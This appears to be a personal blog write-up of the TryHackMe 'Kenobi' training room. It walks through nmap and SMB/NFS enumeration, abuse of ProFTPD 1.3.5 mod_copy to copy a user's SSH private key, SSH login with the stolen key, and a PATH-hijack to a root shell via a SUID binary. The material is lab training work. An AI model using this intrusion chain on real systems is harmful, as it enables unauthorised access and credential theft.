---
title: "TryHackMe Kenobi WriteUp"
url: /WriteUps/TryHackMe/Kenobi
date: 2022-09-03
draft: false
tags: ['TryHackMe','WriteUp','Nmap','SMB','PrivillegeEscalation','Exploit-DB']
icon: '/images/coverimages/Kenobi.png'
description: 'Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.'
---

![Cover Image](/images/coverimages/Kenobi.png "TryHackMe Room Kenobi")
[Room Link: Kenobi](https://tryhackme.com/room/kenobi "TryHackMe Room: Kenobi")

# TryHackMe Kenobi WriteUp

 This is a write up of the Kenobi room in TryHackMe. It is a walk through on exploiting a Linux machine using:
 * [Samba](https://www.samba.org) shares
 * Manipulate vulnerable version proftpd
 * Escalating privilleges path variable manipulation

 Before starting the room I went into my `Documents` folder on my virtual machine and created a folder called `Kenobi` to store files related to the room. Another thing I also did was connect to TryHackMe using the openVPN profile provided. 

## Task 1
 Deploy the vulnerable machine

### Question 1 - No answer required 

### Question 2 
 Scan the machine with [Nmap](https://nmap.org), how many ports are open.

 ![NmapScan Command: `namp -sC -sV 10.10.188.52`](/images/tryhackme/kenobi/01NmapScan.png "")

 Using nmap command `nmap -sC -sV 10.10.188.52` I scanned the machine for open ports. Once the scan had completed I piped the output to a file I called `NmapScan.txt` to my `Kenobi` directory. Looking at the results from the scan, right at the top is sats 993 ports closed. Knowing that by default nmap scans the first 1000 most common ports there are only 7 ports open.

 Full command used: `nmap -sC -sV 10.10.188.52 > Documents/TryHackMe/Kenobi/NmapScan.txt`

 NmapScan.txt
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:18 BST
 Nmap scan report for 10.10.188.52
 Host is up (0.042s latency).
 Not shown: 993 closed tcp ports (conn-refused)
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         ProFTPD 1.3.5
 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
 |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
 |_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
 80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 | http-robots.txt: 1 disallowed entry 
 |_/admin.html
 111/tcp  open  rpcbind     2-4 (RPC #100000)
 | rpcinfo: 
 |   program version    port/proto  service
 |   100000  2,3,4        111/tcp   rpcbind
 |   100000  2,3,4        111/udp   rpcbind
 |   100000  3,4          111/tcp6  rpcbind
 |   100000  3,4          111/udp6  rpcbind
 |   100003  2,3,4       2049/tcp   nfs
 |   100003  2,3,4       2049/tcp6  nfs
 |   100003  2,3,4       2049/udp   nfs
 |   100003  2,3,4       2049/udp6  nfs
 |   100005  1,2,3      40157/udp6  mountd
 |   100005  1,2,3      53254/udp   mountd
 |   100005  1,2,3      56941/tcp   mountd
 |   100005  1,2,3      59183/tcp6  mountd
 |   100021  1,3,4      42337/udp6  nlockmgr
 |   100021  1,3,4      46063/tcp   nlockmgr
 |   100021  1,3,4      46473/tcp6  nlockmgr
 |   100021  1,3,4      49565/udp   nlockmgr
 |   100227  2,3         2049/tcp   nfs_acl
 |   100227  2,3         2049/tcp6  nfs_acl
 |   100227  2,3         2049/udp   nfs_acl
 |_  100227  2,3         2049/udp6  nfs_acl
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
 2049/tcp open  nfs_acl     2-3 (RPC #100227)
 Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
 | smb2-security-mode: 
 |   3.1.1: 
 |_    Message signing enabled but not required
 |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | smb2-time: 
 |   date: 2022-08-09T13:18:31
 |_  start_date: N/A
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 | smb-os-discovery: 
 |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
 |   Computer name: kenobi
 |   NetBIOS computer name: KENOBI\x00
 |   Domain name: \x00
 |   FQDN: kenobi
 |_  System time: 2022-08-09T08:18:31-05:00
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
 ```

## Task 2
 At the beginning of this task it talks about Samba shares and also gives you a command `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP`.

### Question 1
 Using the nmap command above, how many shares have been found?

 ![Nmap SMB Scan `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.52`](/images/tryhackme/kenobi/03NmapSMB.png)

 Looking back at the first namp scan I can see that port 139 and 445 are open and responding. So using the command above, adding in the IP (`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.52`) we can scan through the SMB shares that are on the machine.

 Once again I ran the command and piped the output to a file within the `Kenobi` directory called `NmapSMB.txt`. Looking at the file there are 3 shares that it has found.

 Full command used: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.52 > Documents/TryHackMe/Kenobi/NmapSMB.txt`
 
 NmapSMB.txt
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:25 BST
 Nmap scan report for 10.10.188.52
 Host is up (0.027s latency).
 
 PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
 | smb-enum-shares: 
 |   account_used: guest
 |   \\10.10.188.52\IPC$: 
 |     Type: STYPE_IPC_HIDDEN
 |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
 |     Users: 2
 |     Max Users: <unlimited>
 |     Path: C:\tmp
 |     Anonymous access: READ/WRITE
 |     Current user access: READ/WRITE
 |   \\10.10.188.52\anonymous: 
 |     Type: STYPE_DISKTREE
 |     Comment: 
 |     Users: 0
 |     Max Users: <unlimited>
 |     Path: C:\home\kenobi\share
 |     Anonymous access: READ/WRITE
 |     Current user access: READ/WRITE
 |   \\10.10.188.52\print$: 
 |     Type: STYPE_DISKTREE
 |     Comment: Printer Drivers
 |     Users: 0
 |     Max Users: <unlimited>
 |     Path: C:\var\lib\samba\printers
 |     Anonymous access: <none>
 |_    Current user access: <none>
 
 Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds
 ```

### Question 2
 Once you're connected, list the files on the share. What is the file you can see?

 ![smbclient connect SMB share `smbclient //10.10.188.52/anonymous`](/images/tryhackme/kenobi/04SMBConnect.png)

 Out of the 3 shares that the scan found there is one called `anonymous` which we can try to connect to using the command `smbclient`.

 Full command to connect is `smbclient //10.10.188.52/anonymous` without specifying a password. Once connected I ran the `ls` command and saw a single file called `log.txt`.

### Question 3
 What port is FTP running on?

 ![smbget download log.txt from SMB share `smbget -R smb://10.10.188.52/anonymous`](/images/tryhackme/kenobi/05SMBDownload.png)

 Within the task it says that you can download the file using the command `smbget -R smb://<ip>/anonymous` The `-R` within the command makes it recursive meaning it will download everything within the SMB share it connect to. In this case it will only download `log.txt` as it is the only file within the share.
 
 The command downloads the file to whatever directory you are currently in, so to make sure I did not lose track of `log.txt` I moved it to the `kenobi` directory using the command `mv log.txt Documents/TryHackMe/Kenobi/`. 

 For this question though I did not look at the log file as the standard port for FTP is port 21. I could also have looked at the Nmap scan I ran earlier where it also tells us which port FTP is running on.

 If you take a look in the log file it does say that FTP is running on port 21.

 ![log.txt SMB port](/images/tryhackme/kenobi/18FTPPort.png)

### Question 4
 What mount can we see?

 ![Nmap NFS scan `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.188.52`](/images/tryhackme/kenobi/06NFSMountPoint.png)

 This task once again provides us with a command that we can run within the terminal `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP`. Copying the command into the terminal and adding in the machine IP, you see a single mount point.

 Full command used: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.188.52 > Documents/TryHackMe/Kenobi/NmapNFS.txt`

 NmapNFS.txt
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:42 BST
 Nmap scan report for 10.10.188.52
 Host is up (0.054s latency).
 
 PORT    STATE SERVICE
 111/tcp open  rpcbind
 | nfs-showmount: 
 |_  /var *
 
 Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 ```

## Task 3

### Question 1
 What is the version?

 This questions asks us to use [NetCat](https://www.kali.org/tools/netcat/) to connect to the machine using the FTP port (port 21). I am not very familiar with NetCat so did a quick Google on how to use it thinking that I need to add in arguments for the port, IP and a given service that I am trying to connect to but no. For NetCat to connect simply use the command `nc 10.10.188.52 21` (replace `10.10.188.52` with the IP address specific to the machine you are trying to access.) 

 ![NetCat connect FTP `nc 10.10.188.52 21`](/images/tryhackme/kenobi/07NetCat.png)

### Question 2
 How many exploits are there for the ProFTPD running?

 ![SearchSploit ProFTPD 1.2.5 `searchsploit ProFTPD 1.3.5`](/images/tryhackme/kenobi/08SearchSploit.png)

 There are 2 different ways that I can think of to approach this question. Number 1 is open a web browser, go to Exploit-DB, enter into the search field `ProFTPD Version 1.3.5` and count the number of result that are returned. Or number 2 is to use [SearchSploit](https://www.exploit-db.com/searchsploit) which is effectively the same thing but within the terminal.

 Entering `searchsploit ProFTPD 1.3.5` into the terminal should give you the required results. Once again I re-ran the command and saved the ouput to a file.

 Full command used: `searchsploit ProFTPD 1.3.5 > Documents/TryHackMe/Kenobi/SearchSploit-ProFTPD.txt`

 SearchSploit-ProFTPD.txt
 ```
 ---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
 ---------------------------------------------------------------------- ---------------------------------
 [01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - 'mod_copy' Command Execution (Metasploit)             | linux/remote/37262.rb
 [01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - 'mod_copy' Remote Command Execution                   | linux/remote/36803.py
 [01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - 'mod_copy' Remote Command Execution (2)               | linux/remote/49908.py
 [01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - File Copy                                             | linux/remote/36742.txt
 ---------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```

### Question 3 - No Answer Required
 This question talk about the `mod_copy` exploit listed in the `SearchSploit-ProFTPD.txt` results. Any unauthenticated client can use the commands to copy files from any part of the system to a chosen destination.

### Question 4 - No Answer Required

 ![NetCat move id_rsa key](/images/tryhackme/kenobi/09NetCatMoveItem.png)

 Here we implement what was talked about in question 3, using the commands to copy Kenobi's `id_rsa` ssh key to the `var/tmp` directory as we know that we can access the `/var` directory.

### Question 5
 What is Kenobi's user flag (/home/kenobi/user.txt)?

 Using the commands within the question you can mount the directory and copy the `id_rsa` key that we just moved.

 ```
 mkdir /mnt/kenobiNFS
 mount 10.10.188.52:/var /mnt/kenobiNFS
 ls -al /mnt/kenobiNFS
 cp /mnt/kenobiNFS/tmp/id_rsa Documents/TryHackMe/Kenobi/id_rsa
 ```

 ![Mounting kenobi var directory](/images/tryhackme/kenobi/10MntKenobi.png)

 Once the `id_rsa` key has been copied onto our local machine, we have to get ownership of the key. Normally I would just `chmod 777 id_rsa` but because it is an ssh key if everyone on the computer has full access to it, it will not grant you connect. So instead you have to use `chmod 600 id_rsa`. Once we have ownership over the key we can use it to establish an ssh connection to the machine.

 ```
 sudo chmod 600 Documents/TryHackMe/Kenobi/id_rsa
 ssh -i Documents/TryHackMe/Kenobi/id_rsa kenobi@10.10.188.52
 ```

 ![Modifying permissions id_rsa key](/images/tryhackme/kenobi/11CopySSH.png)

 Now we are connected to the machine as Kenobi we can navigate to `/home/kenobi` and read `user.txt`. 

 `cat user.txt`

 ![User.txt](/images/tryhackme/kenobi/13UserTXT.png)

## Task 4
 Now we are going to escalate from user permissions to root permissions because while Kenobi may have root access we do not know their password so cannot use `sudo`.

### Question 1
 What file looks particularly out of the ordinary?

 Running the following command `find / -perm -u=s -type f 2>/dev/null` which will list a series of commands which are owned by root but can be run by Kenobi with using `sudo`.

 Looking at the commands that were listed there were 2 that I noticed being slightly strange `/usr/bin/at` and `/usr/bin/menu`. As the question was asking for a work made of 4 letter it is not going to be `/usr/bin/at`

 ![SUID listed commands](/images/tryhackme/kenobi/14SUID.png)

 Honestly I had to look up SUID to fully understand what the command was doing and I am still not 100% sure my explaination is correct. [Linux permissions: SUID, SGID, and sticky bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)

### Question 2
 Run the binary, how many options appear?

 Running the command is as simple as entering its path into the terminal `/usr/bin/menu`

 ![Running `/usr/bin/menu`](/images/tryhackme/kenobi/15MenuCommand.png)

### Question 3 - No Answer Required
 Using `/usr/bin/menu` we are going to gain a root shell. All the commands for this are written within the task but I am going to reiterate them here just incase.

 ```
 echo /bin/sh > curl
 chmod 777 curl
 export PATH=/tmp:$PATH
 /usr/bin/menu
 ```

 ![Gaining Root shell](/images/tryhackme/kenobi/16RootShell.png)

 Select option 1. Now you have a root shell. From here you can navigate to `/root/` and print out `root.txt`

 ![Root.txt](/images/tryhackme/kenobi/17RootTXT.png)

## Summary
 With that last bit Kenobi is completed. While this room gave a lot of guidance on how to complete it there were still some bits that required a small amount of research. Looking back on how I approached some of the tasks there are a lot of things that I could have done differently and some of the commands that the room said to run could have been completely ignored (given my completely overkill Nmap scan at the start of tthe room) but it is a learning journey and I feel like I have learnt quite a bit.